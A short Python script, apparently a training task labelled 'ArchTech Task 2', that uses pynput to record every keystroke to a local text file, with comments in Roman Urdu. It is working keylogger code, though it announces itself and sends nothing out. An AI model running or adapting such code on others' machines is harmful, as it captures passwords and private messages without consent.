from pynput.keyboard import Key, Listener

# Ye file hai jahan keys save hongi
log_file = "key_log.txt"

def on_press(key):
    # Jo bhi button dabaya jaye, usay file mein likho
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Special keys ke liye (Space, Enter, etc.)
            f.write(f" [{key}] ")

print("--- ArchTech Task 2: Keylogger Running ---")
print("[*] Recording keystrokes... Press Ctrl+C in CMD to stop.")

# Keyboard ko listen karne wala function
with Listener(on_press=on_press) as listener:
    listener.join()